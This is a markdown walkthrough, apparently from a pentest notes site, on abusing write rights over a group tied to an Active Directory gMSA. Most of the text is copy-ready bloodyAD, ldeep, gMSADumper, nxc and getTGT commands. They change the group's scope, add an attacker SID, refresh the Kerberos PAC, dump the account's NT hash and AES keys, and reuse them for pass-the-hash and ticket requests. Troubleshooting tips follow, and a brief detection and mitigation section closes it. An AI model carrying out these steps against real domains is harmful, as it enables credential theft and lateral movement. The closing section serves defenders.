---
title: gMSA — read the managed password by abusing the group
tags: [windows, active-directory, gmsa, ldap, kerberos, privesc]
---

# gMSA: from a `GenericAll` on the group to the account key

**English** | [🇪🇸 Español](gmsa-read-key.md)

## 1. How a gMSA is protected

A *group Managed Service Account* stores its password in `msDS-ManagedPassword`, readable only by the principals (by SID) listed in `msDS-GroupMSAMembership`. That attribute usually points to a **group**, not to individual users.

Consequence: whoever can write to that group's membership —or holds `GenericAll` on the gMSA— can add themselves and read the key.

## 2. Enumerate

```bash
ldeep ldap -u '<user>' -p '<password>' -d '<domain>' -s 'ldap://<DC_IP>' search '(objectClass=msDS-GroupManagedServiceAccount)' msDS-GroupMSAMembership sAMAccountName
```

Or with `bloodyAD`:

```bash
bloodyAD -u '<user>' -p '<password>' -d '<domain>' --host <DC_IP> get object 'CN=<gMSA>,CN=Managed Service Accounts,DC=<domain>,DC=<tld>' --attr msDS-GroupMSAMembership,sAMAccountName
```

The value is a binary `SD`: the DACL lists the authorized SIDs. Find the group holding them and check your rights on it:

```bash
bloodyAD -u '<user>' -p '<password>' -d '<domain>' --host <DC_IP> get object 'CN=<group>,CN=Users,DC=<domain>,DC=<tld>' --attr groupType,member
```

`GenericAll`/`WriteProperty` on the group (including `msDS-GroupMSAMembership`) is the way in.

## 3. Change the group scope and add yourself

A **Global** group cannot hold members from another domain; a **Domain Local** one can. `groupType` values say it all:

| Value | Meaning |
|---|---|
| `-2147483646` | Global, security |
| `-2147483640` | Universal, security |
| `-2147483644` | Domain Local, security |

The sequence that works when attacking from another domain: Global → Universal → Domain Local, then add the user by **SID** (the name may not resolve across domains).

```bash
bloodyAD -u '<user>' -p '<password>' -d '<domain>' --host <DC_IP> set object 'CN=<group>,CN=Users,DC=<domain>,DC=<tld>' groupType -v -2147483640
bloodyAD -u '<user>' -p '<password>' -d '<domain>' --host <DC_IP> set object 'CN=<group>,CN=Users,DC=<domain>,DC=<tld>' groupType -v -2147483644
bloodyAD -u '<user>' -p '<password>' -d '<domain>' --host <DC_IP> add groupMember 'CN=<group>,CN=Users,DC=<domain>,DC=<tld>' 'S-1-5-21-<other-domain>-1105'
```

## 4. Refresh the PAC before reading

Your current ticket does not carry the new group. Request a new one and a service ticket so the PAC is rebuilt:

```bash
kinit '<user>@<DOMAIN>'          # or getTGT.py with -dc-ip
kvno 'ldap/<dc>.<domain>'
```

Without this, `ldeep`/`gMSADumper` authenticate with the old PAC and the DC answers as if you were not a member (or with `KRB_AP_ERR_MODIFIED`).

## 5. Read the password

```bash
ldeep ldap -u '<user>' -p '<password>' -d '<domain>' -s 'ldap://<DC_IP>' gmsa
gMSADumper.py -u '<user>' -p '<password>' -d '<domain>' -l '<DC_IP>'
```

It returns the `msDS-ManagedPassword` blob, yielding the **NT hash** and the **AES128/AES256** keys. Usage:

```bash
nxc smb <TARGET> -u '<gMSA>$' -H '<NT_HASH>'
nxc winrm <TARGET> -u '<gMSA>$' -H '<NT_HASH>'
```

Pure Kerberos:

```bash
getTGT.py -dc-ip <DC_IP> '<domain>/<gMSA>$' -aesKey '<AES256>'
export KRB5CCNAME='<gMSA>$.ccache'
nxc smb <TARGET> -k --use-kcache
```

## 6. Typical errors

- **`The specified account does not exist`** when adding by SID → the SID does not resolve in that domain; use the object's full SID, not the name.
- **`Unwilling to perform`** on `groupType` → the group has members incompatible with the new scope; remove the offending member or use another group.
- **`LDAP error 53`** → the attribute is a system one; you need delegated rights, not necessarily domain admin.
- **No key returned** → PAC not refreshed (step 4) or the principal is not in `msDS-GroupMSAMembership`.
- **`KRB_AP_ERR_SKEW`** → clock; see [clock and Kerberos](../general/kerberos-clock.en.md).

## 7. Detection and mitigation

- **4662** on `msDS-GroupMSAMembership` and `groupType` changes in **5136**.
- **4728/4732** (group membership added) from accounts that do not manage service identities.
- Alert on `kvno` for `ldap/<dc>` followed by bulk reads of `msDS-ManagedPassword`.
- Restrict who can write to groups referenced by gMSAs; avoid Global groups when cross-domain trusts exist.
- Rotate the gMSA password (`Reset-ADServiceAccountPassword`) after an incident.

MITRE: T1558, T1087.002, T1098.
